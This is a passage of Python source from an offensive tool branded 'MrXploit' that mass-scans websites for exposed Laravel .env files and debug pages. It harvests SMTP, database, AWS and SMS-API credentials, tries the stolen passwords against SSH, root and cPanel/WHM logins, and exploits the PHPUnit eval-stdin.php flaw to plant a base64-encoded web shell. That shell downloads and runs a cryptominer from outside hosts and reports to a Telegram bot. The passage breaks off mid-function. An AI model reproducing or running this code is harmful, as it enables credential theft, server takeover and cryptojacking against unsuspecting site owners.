						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'rise-tokyo' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RISE-TOKIO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'tatsumi-b' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(TATSUMI).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'sendinblue' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SENDINBLUE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					else:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						build2 = str(mailhost)+'|'+str(mailuser)+'|'+str(mailpass)+'|0'
						remover = str(build).replace('\r', '')
						remover2 = str(build2).replace('\r', '')
						print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SMTP {fc}[{yl}{mailhost}{res}{fc}]")
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						save = open('Results/SMTP(MrXploit_sender).txt', 'a')
						save.write(remover2+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					return True
			else:
				return False
		except:
			return False
	def get_database(self, text, url):
		try:
			if "DB_HOST" in text:
				if "DB_HOST=" in text:
					method = '/.env'
					try:
						db_host = reg('\nDB_HOST=(.*?)\n', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('\nDB_PORT=(.*?)\n', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('\nDB_DATABASE=(.*?)\n', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('\nDB_PASSWORD=(.*?)\n', text)[0]
					except:
						db_pass = ''
				elif "<td>DB_HOST</td>" in text:
					method = 'debug'
					try:
						db_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_host = ''
					try:
						db_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_port = ''
					try:
						db_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_name = ''
					try:
						db_user = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_user = ''
					try:
						db_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						db_pass = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(db_host)+'\nDB_PORT: '+str(db_port)+'\nDB_NAME: '+str(db_name)+'\nDB_USER: '+str(db_user)+'\nDB_PASS: '+str(db_pass)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}DATABASE {fc}[{yl}{db_host}{res}{fc}]")
				save = open('Results/DATABASE.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_database2(self, text, url):
		pm = pma(url)
		pmp = pm.check()
		if 'DB_USERNAME=' in text:
			method = '/.env'
			db_host = re.findall('\nDB_HOST=(.*?)\n', text)[0]
			db_dbse = re.findall('\nDB_DATABASE=(.*?)\n', text)[0]
			db_user = re.findall('\nDB_USERNAME=(.*?)\n', text)[0]
			db_pass = re.findall('\nDB_PASSWORD=(.*?)\n', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/database_PMA.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		elif '<td>DB_USERNAME</td>' in text:
			method = 'debug'
			db_host = re.findall('<td>DB_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_dbse = re.findall('<td>DB_DATABASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_user = re.findall('<td>DB_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			db_pass = re.findall('<td>DB_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
			build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\n'
			if pmp:
				build += 'PMA: ' + str(pmp) + '\n'
			build += 'HOST: ' + str(db_host) + '\nDATABSE: ' + str(db_dbse) + '\nUSERNAME: ' + str(db_user) + '\nPASSWORD: ' + str(db_pass) + '\n'
			remover = str(build).replace('\r', '')
			if pmp:
				fp = open('Results/phpmyadmin.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
			else:
				fp = open('Results/database.txt', 'a+')
				fp.write(remover + '\n')
				fp.close()
		return pmp
	def get_ssh1(self, text, url):
		#headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		#text = requests.get(url+"/.env", headers=headers, timeout=15, verify=False, allow_redirects=False).text
		if 'DB_PASSWORD' in text and 'DB_HOST' in text:
			if '://' in url:
				parse = url.split('://', 2)
				parse = parse[1]
				parse = parse.split('/')
				host = parse[0]
			else:
				parse = parse.split('/')
				host = parse[0]

			# grab password
			if 'DB_USERNAME=' in text:
				method = './env'
				db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
				db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
			elif '<td>DB_USERNAME</td>' in text:
				method = 'debug'
				db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			# login ssh
			if db_user and db_pass:
				connected = 0
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				try:
					ssh.connect(host, 22, db_user, db_pass, timeout=3)

					fp = open('Results/Vps.txt', 'a+')
					build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
					remover = str(build).replace('\r', '')
					fp.write(remover + '\n')
					fp.close()
					connected += 1
				except:
					pass
				finally:
					if ssh:
						ssh.close()

				if db_user != 'root':
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, 'root', db_pass, timeout=30)
						stdin, stdout, stderr = ssh.exec_command('uname -a', timeout=10)
						print (stdout.channel.recv_exit_status())
						fp = open('Results/Vps.txt', 'a+')
						build = 'root'+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if '_' in db_user:
					aw, iw = db_user.split('_')
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					#stdin, stdout, stderr = ssh.exec_command("cd /tmp; wget 185.213.209.151/kk.tar.gz; tar -zxf kk.tar.gz; mv dontkillme cpu; ./cpu -a cpupower -o stratum+tcp://mine.zpool.ca:6240 -u MQRaq9PgkzY6QXWF3dyjeeoVoiPtmzDBVQ -p yespowesugar=0.5,yespowerR16=0.5,power2b=03,c=LTC,sd=0.5,sd=0.1 --api-bind 0 --no-longpoll --randomize --cpu-affinity 0x555 --background")
					try:
						ssh.connect(host, 22, iw, db_pass, timeout=30)

						fp = open('Results/Vps.txt', 'a+')
						build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()
				if '-' in db_user:
					aw, iw = db_user.split('-')
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, aw, db_pass, timeout=30)

						fp = open('Results/Vps.txt', 'a+')
						build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, aw, db_pass, timeout=30)

						fp = open('Results/Vps.txt', 'a+')
						build = str(db_user)+':'+str(db_pass)+' ('+str(url)+') ['+str(host)+']'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if connected > 0:
					return connected
				else:
					return False
		else:
			return False
	def get_ssh2(self, text, url):
		if "DB_USERNAME" in text:
			if "DB_USERNAME=" in text:
				method = '/.env'
				try:
					dabes_conn = reg('\nDB_CONNECTION=(.*)\n', text)[0]
				except:
					dabes_conn = ''
				try:
					dabes_host = reg('\nDB_HOST=(.*)\n', text)[0]
				except:
					dabes_host = ''
				try:
					dabes_port = reg('\nDB_PORT=(.*)\n', text)[0]
				except:
					dabes_port = ''
				try:
					dabes_name = reg('\nDB_DATABASE=(.*)\n', text)[0]
				except:
					dabes_name = ''
				try:
					dabes_auth = reg('\nDB_USERNAME=(.*)\n', text)[0]
				except:
					dabes_auth = ''
				try:
					dabes_pass = reg('\nDB_PASSWORD=(.*)\n', text)[0]
				except:
					dabes_pass = ''
			elif '<td>DB_USERNAME</td>':
				method = 'debug'
				try:
					dabes_conn = reg('<td>DB_CONNECTION<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_conn = ''
				try:
					dabes_host = reg('<td>DB_HOST<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_host = ''
				try:
					dabes_port = reg('<td>DB_PORT<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_port = ''
				try:
					dabes_name = reg('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_name = ''
				try:
					dabes_auth = reg('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_auth = ''
				try:
					dabes_pass = reg('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*)<\/span>', text)[0]
				except:
					dabes_pass = ''
			if dabes_auth == "" or dabes_pass == "":
				return False
			else:
				if dabes_auth == "root":
					build = 'URL: '+str(url)+'|'+str(dabes_auth)+'|'+str(dabes_pass)
					remover = str(build).replace('\r', '')
					save = open('Results/VPS.txt', 'a')
					save.write(remover+'\n')
					save.close()
				else:
					build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_CONNECTION: '+str(dabes_conn)+'\nDB_HOST: '+str(dabes_host)+'\nDB_PORT: '+str(dabes_port)+'\nDB_DATABASE: '+str(dabes_name)+'\nDB_USERNAME: '+str(dabes_auth)+'\nDB_PASSWORD: '+str(dabes_pass)
					remover = str(build).replace('\r', '')
					save = open('Results/MYSQL.txt', 'a')
					save.write(remover+'\n\n')
					save.close()

def printfa(text):
	''.join([str(item) for item in text])
	print(text),
pathname = 'MrXploit.php'

def phpunit(url):
    path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    url = url + path
    phpinfo = "<?php phpinfo(); ?>"
    try:
        requester_1 = requests.post(url, data=phpinfo, timeout=15, verify=False)
        if "phpinfo()" in requester_1.text:
            payload_ = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAgZWNobyAnPGNlbnRlcj48aDE+TEVHSU9OIEVYUExPSVQgVjQgKE7Eg3ZvZGFyaSBQb3dlcik8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnO2VjaG8nPGZvcm0gbWV0aG9kPSJwb3N0ImVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPic7ZWNobyc8aW5wdXQgdHlwZT0iZmlsZSJuYW1lPSJmaWxlIj48aW5wdXQgbmFtZT0iX3VwbCJ0eXBlPSJzdWJtaXQidmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoICRfUE9TVFsnX3VwbCddPT0iVXBsb2FkIil7aWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7ZWNobyc8Yj5MRUdJT04gRXhwbG9pdCBTdWNjZXNzITwvYj4nO31lbHNle2VjaG8nPGI+TEVHSU9OIEV4cGxvaXQgU3VjY2VzcyE8L2I+Jzt9fSBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMTEyL3JjZS9sb2FkIC1vIGFkaW5kZXgucGhwOyBjZCAvdG1wOyBjdXJsIC1PIDkxLjIxMC4xNjguODAvbWluZXIuanBnOyB0YXIgeHp2ZiBtaW5lci5qcGcgPiAvZGV2L251bGw7IHJtIC1yZiBtaW5lci5qcGc7IGNkIC54OyAuL3ggPiAvZGV2L251bGwnKTsKPz4="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("MrXploit EXPLOIT V3"); ?>'
            send_payload = requests.post(url, data=payload_, timeout=15, verify=False)
            if "MrXploit EXPLOIT V3" in send_payload.text:
                status_exploit = "Successfully"
            else:
                status_exploit = "Can't exploit"
        else:
            status_exploit = "May not vulnerable"
    except Exception as err:
        status_exploit = 'ERROR: ' + str(err)
    return status_exploit

def prepare_phpunit(url):
    if "://" not in url:
        url = 'http://' + url
    if url.endswith('/'):
        url = url[:-1]

    get_status_exploit = phpunit(url)
    if get_status_exploit == "Successfully":
        print(f'{fc}[{gr}SHELL UPLOAD{fc}] {res}{url} {fc}/ {res}{pathname} {gr}Successfully')
        open('Results/!MrXploit_Shell.txt', 'a').write(url + '/' + pathname + '\n')
        message = {'text': f"🙈  Mr Xploit [SHELL UPLOAD]\n{url}/{pathname}\n"}
        requests.post("https://api.telegram.org/bot" + bot_token +"/sendMessage?chat_id=" + chat_id ,data=message)
    elif get_status_exploit == "Can't exploit":
        print(f'{fc}[{gr}SHELL UPLOAD{fc}] {res}{url} {red}Can\'t exploit')
        open('Results/!MrXploit_error_spawn_shell.txt', 'a').write(url + '\n')
    else:
        print(f'{fc}[{gr}SHELL UPLOAD{fc}] {get_status_exploit}')

def legaMrXploit22(url):
	global progres
	asu = url
	resp = False
	jmbt = [
    '/.env',
    #'/core/.env',
    #'/beta/.env',
    #'/backend/.env',
    #'/laravel/.env',
    #'/kyc/.env',
    #'/frontend/.env',
    #'/admin/.env',
    #'/prod/.env',
    #'/api/.env',
    #'/production/.env',
    #'/home/.env',
    #'/.env.example',
    #'/.env.local',
    #'/.env.bak',
    #'/config.env',
    #'/.env.production',
    #'/public/.env',
    #'/vendor/.env',
    '/sendgrid/.env'
		]
	tmpix = [
		'/',
		#'/core/.env',
		#'/core/',
		#'/beta/',
		#'/laravel/.env',
        #'/sendgrid/.env',
        '/sendgrid/'
		#'/kyc/',
		#'/admin/',
		#'/prod/',
		#'/api/',
		#'/public/'
		]
	
def legaMrXploit(url):
	global progres
	asu = url
	resp = False
	jmbt = [
    '/.env',
    #'/core/.env',
    #'/beta/.env',
    #'/backend/.env',
    #'/laravel/.env',
    #'/kyc/.env',
    #'/frontend/.env',
    #'/admin/.env',
    #'/prod/.env',
    #'/api/.env',
    #'/production/.env',
    #'/home/.env',
    #'/.env.example',
    #'/.env.local',
    #'/.env.bak',
    #'/config.env',
    #'/.env.production',
    #'/public/.env',
    #'/vendor/.env',
    '/sendgrid/.env'
		]
	tmpix = [
		'/',
		#'/core/.env',
		#'/core/',
		#'/beta/',
		#'/laravel/.env',
        #'/sendgrid/.env',
        '/sendgrid/'
		#'/kyc/',
		#'/admin/',
		#'/prod/',
		#'/api/',
		#'/public/'
		]

def printf3(text):
	''.join([str(item) for item in text])
	print(text),

	def gasken(self,url, urutan):
		global progres
		progres = progres + 1

		try:
			response_text = False
			ayey_env = laravelpaths
			cekidot = False
			eyey_result = ''
			for x in ayey_env:
				headers =  {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
				eeyey = requests.get(url+x, headers=headers, timeout=5, verify=False, allow_redirects=False).text

				if 'APP_KEY=' in eeyey:
					cekidot = True
					eyey_result = eeyey


			if cekidot:
				response_text = eyey_result
			else:
				aweu = requests.post(url, data={"0x[]":"janc0xsec"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
				if "<td>APP_KEY</td>" in aweu:
					response_text = aweu


			if response_text:
				self.save(url, 'Results/vuln.txt')
				twilio = self.get_twilio(response_text,url)
				twilio2 = self.get_database(response_text,url)
				smtp = self.get_smtp(response_text,url)
				plivo = self.get_plivo(response_text,url)
				#nexmo = self.get_nexmo(response_text,url)
				clickatell = self.get_clickatell(response_text,url)
				getdb = self.get_db(response_text,url)
				aws = self.get_aws(response_text,url)
				payment = self.payment_api(response_text,url)
				db2 = self.get_nexmo2(response_text,url)
				pma = self.get_database2(response_text,url)
				phpunit = self.phpunit(url)

				if smtp:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}SMTP{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if aws:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}AWS{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if twilio:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc} [{gr}TWILIO{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if plivo:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}PLIVO{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if nexmo:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}NEXMO{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if clickatell:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}CLICKATELL{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if getdb:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}Database{fc}] {fc}({gr}{x}{fc}) {gr}✓")

				if phpunit:
					print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {fc}[{gr}PHPUNIT{fc}] {fc}({gr}{x}{fc}) {gr}✓")

			else:
				print(f"{red}[{gr}{str(progres)}{red}] {res}{url} {red}Can\'t get everything {red}✗")
				self.save(url, 'Results/not_vuln.txt')

		except Exception as e:
			pass

exploitMrXploit = _exploit()



def formaturl(url):
    if not re.match('(?:http|ftp|https)://', url):
        return 'http://{}'.format(url)
    return url

def bagaincap():

	try:
		lisnya = input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
		trit = int(input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit Priv8\033[31;1m]--\033[31;1m[\033[32;1mGive me your Thread\033[31;1m]\n└─╼\033[32;1m#"))

		os.system('cls' if os.name == 'nt' else 'clear')


		try:
			i = 1

			Th = ThreadPool(int(trit))

			with open(lisnya, 'r') as url:


				for x in url:
					Th.add_task(exploitMrXploit.gasken, formaturl(x.strip()), i)
					i += 1

			Th.wait_completion()

		except IOError as e:
			print("[-] YOUR LIST NOT FOUND !")
			sys.exit()

	except Exception as e:
		raise e
#Start Reverse
def gass(ip):
    try:
        result = requests.get('https://www.threatcrowd.org/searchApi/v2/ip/report/?ip=' + ip, timeout=20)
        j = json.loads(result.text)
        if '{"response_code":"0"}' in result.text:
            print (f'{gr}[{red}{ntime()}{gr}] {red}{ip}{res} {fc}╾┄╼{yl}[{red}BAD{yl}]')
        else:
            print (f'{gr}[{red}{ntime()}{gr}] {ip}{res} {fc}╾┄╼ {mg}[{gr}LIVE{mg}]')

            for asu in j['resolutions']:
                open('Reverse/reversed.txt', 'a').write(str(asu['domain'] + '\n'))
                print (f'[{gr}MrXploit Reverse{yl}] {fc}Fetching {yl}=> {gr}{ip}{res} {fc}╾┄╼ {yl} {red}╾┄╼ {gr}'+str(asu['domain']))
                clean()


    except:
        pass

def ranga(url):
    try:
        host = url.strip()
        prefix = host.split('.')
        jancok = prefix[0] + '.' + prefix[1] + '.' + prefix[2]
        for i in range(256):
            ip = jancok + '.%d' % i
            gass(ip)


    except:
        pass
#stop Reverse

#Get ENV + Debug
def prepare(sites):
    global progres
    try:
        meki = requests.get((sites + '/.env'), headers=Headers, timeout=8)
        if 'DB_PASSWORD=' in meki.text:
            print(f'{cy}{str(progres)} {gr}#{res}{str(sites)}{cy} ╾┄╼ {gr}VULN{res}')
            progres = progres + 1
            open('Debug/config-Grab.txt', 'a').write('\n---------------MY MrXploit env GRAB-------------\n\n' + sites + '\n' + meki.text + '\n-----------------------------------------\n\n')
            open('Debug/Laravel_info.txt', 'a').write(sites +'/.env\n')
        else:
            print(f'{cy}{str(progres)} {red}#{res}{str(sites)}{mg} ╾┄╼ {red}NOT VULN{res}')
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e
#Clean
def clean2():
    lines_seen = set()
    Targetssa = input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit \033[32;1m+ \033[31;1mREMOVE DUPLICATES\033[31;1m]--\033[31;1m[\033[32;1mGive me your List\033[31;1m]\n└─╼\033[32;1m#")
    outfile = open('list-' + Targetssa, 'a')
    infile = open(Targetssa, 'r')
    for line in infile:
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)

    outfile.close()
    infile.close()
    print('Duplicate removed successfully!')
    print('saved as rd-' + str(Targetssa))
    print('Load Menu On 1 sec')
    print('-------------------------------')
    time.sleep(1)
    alege()

def mainalla():
	start = time.time()
	try:
		aws_key = input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit SMTP\033[31;1m]--\033[31;1m[\033[32;1mYour AWS KEY\033[31;1m]\n└─╼\033[32;1m#")
		aws_sec = input("\033[31;1m┌─\033[31;1m[\033[36;1mMrXploit SMTP\033[31;1m]--\033[31;1m[\033[32;1mYour AWS SECRET\033[31;1m]\n└─╼\033[32;1m#")
		reglist = [
			'us-east-2',
			'us-east-1',
			'us-west-1',
			'us-west-2',
			'ap-south-1',
			'ap-southeast-1',
			'ca-central-1',
			'eu-central-1',
			'eu-west-1',
			'eu-west-2',
			'eu-south-1',
			'eu-west-3',
		]
		countsd = 0
		for region in reglist:
			countsd += 1
			check3(countsd, aws_key, aws_sec, region)

	finally:
		print("Done...")
		elapsed_time = time.time() - start
		timer = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
		print("Total Time: {timer}".format(timer=timer))


def gass20(ip):
    try:
        result = requests.get('https://www.threatcrowd.org/searchApi/v2/ip/report/?ip=' + ip, timeout=20)
        j = json.loads(result.text)
        if '{"response_code":"0"}' in result.text:
            print (f'{gr}[{red}{ntime()}{gr}] {red}{ip}{res} {fc}╾┄╼{yl}[{red}BAD{yl}]')
        else:
            print (f'{gr}[{red}{ntime()}{gr}] {ip}{res} {fc}╾┄╼ {mg}[{gr}LIVE{mg}]')

            for asu in j['resolutions']:
                open('Reverse/reversed.txt', 'a').write(str(asu['domain'] + '\n'))
                print (f'[{gr}MrXploit Reverse{yl}] {fc}Fetching {yl}=> {gr}{ip}{res} {fc}╾┄╼ {yl} {red}╾┄╼ {gr}'+str(asu['domain']))
                clean()


    except:
        pass

def ranga(url):
    try:
        host = url.strip()
        prefix = host.split('.')
        jancok = prefix[0] + '.' + prefix[1] + '.' + prefix[2]
        for i in range(256):
            ip = jancok + '.%d' % i
            gass20(ip)


    except:
        pass

def getips():
    global progres
    (ip, cidr) = input(f'{red}┌─{res}[{cy}MrXploit Priv8{res}]{gr}─{res}[{mg}/{gr}Give me your {fc}IPV4{red}/{res}]\n{red}└─╼ {res}~{gr}# {res}').split('/')
    cidr = int(cidr)
    host_bits = 32 - cidr
    i = struct.unpack('>I', socket.inet_aton(ip))[0] # note the endianness
    start = (i >> host_bits) << host_bits # clear the host bits
    end = start | ((1 << host_bits) - 1)

    # excludes the first and last address in the subnet
    for i in range(start, end):
        gud = socket.inet_ntoa(struct.pack('>I',i))
        open('ipos.txt', 'a').write(gud+'\n')
        progres = progres + 1
        print(f'{mg}{progres} {red}┌─{res}[{gr}IP {yl}GRABBER{res}] {mg}─╼ {fc}[{red}IP{res}: {gr}{gud}{fc}]')


def envold(url,dom) :
    global progres
    progres = progres + 1
    try:
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        }
        pathes = [".env"]
        for path in pathes:
            try:
                inj = url + path
                check_inj = requests.get(inj,headers=headers, allow_redirects=True, timeout=15).text
                if 'DB_PASSWORD' in check_inj:
                    passwords = []
                    print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}Laravel VULN')
                    Gethost = re.findall("DB_HOST=(.*)", check_inj)[0]
                    Getuser = re.findall("DB_USERNAME=(.*)", check_inj)[0]
                    Getpass = re.findall("DB_PASSWORD=(.*)", check_inj)[0]
                    Getdb = re.findall("DB_DATABASE=(.*)", check_inj)[0]
                    if 'DB2_PASSWORD' in check_inj :
                        Getpass2 = re.findall("DB2_PASSWORD=(.*)", check_inj)[0]
                        if '"' in Getpass2:
                            Getpass2 = Getpass2.replace('"', '')
                        if 'null' not in Getpass2 and Getpass2 != '':
                            passwords.append(Getpass2)
                    if '"' in Gethost:
                        Gethost = Gethost.replace('"', '')
                    if '"' in Getuser:
                        Getuser = Getuser.replace('"', '')
                    if '"' in Getpass:
                        Getpass = Getpass.replace('"', '')
                    if '"' in Getdb:
                        Getdb = Getdb.replace('"', '')
                    if 'null' not in Getpass and Getpass != '' :
                        passwords.append(Getpass)
                        open('Results/Valid_db-ssh.txt', 'a').write(url + '|22|'+ Getuser + '|' + '|' + Getpass+'\n')


                    if "DB_USERNAME=root" in check_inj:
                        ROOTU = re.findall('DB_USERNAME=(.*)', check_inj)[0]
                        ROOTP = re.findall('DB_PASSWORD=(.*)', check_inj)[0]
                        if '"' in ROOTU:
                            ROOTU = ROOTU.replace('"', '')
                        if '"' in ROOTP:
                            ROOTP = ROOTP.replace('"', '')
                        if 'null' not in ROOTP and ROOTP != '' :
                            print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}DB ROOT Found')
                            open('Results/Valid_DB-Roots-env.txt', 'a').write(dom + '|root|' + ROOTP + '\n')
                    if passwords and 'null' not in Getuser and Getuser != '' :
                        req = requests.session()
                        try:
                            checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, timeout=30).text
                        except:
                            try :
                                requests.packages.urllib3.disable_warnings()
                                checkcp = requests.get('https://' + dom + ':2083/login/',headers=headers, verify=False, timeout=30).text
                            except:
                                checkcp = 'xxxxxxxx'
                                pass
                        if 'cPanel' in checkcp :
                            if '_' in Getuser :
                                username = re.findall("(.*)_", Getuser)[0]
                            else :
                                username = Getuser
                            for password in passwords:
                                postlogin = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                try:
                                    login = req.post('https://' + dom + ':2083/login/',headers=headers,data=postlogin, timeout=30)
                                except:
                                    requests.packages.urllib3.disable_warnings()
                                    login = req.post('https://' + dom + ':2083/login/',headers=headers, verify=False, data=postlogin,timeout=30)
                                if 'filemanager' in login.text:
                                    print(f'{fc}[{res}{url}{fc}] {yl}[{fc}{path}{yl}] {gr}CPANEL Found')
                                    open('Results/!Valid_cPanels.txt', 'a').write('https://' + dom + ':2083|'+username+'|'+password+'\n')
                                    postloginWHM = {'user': username, 'pass': password, 'login_submit': 'Log in'}
                                    postloginRoot = {'user': 'root', 'pass': password, 'login_submit': 'Log in'}
                                    try:
                                        loginWHM = req.post('https://' + dom + ':2087/login/',headers=headers, data=postloginWHM, timeout=30)
                                    except:
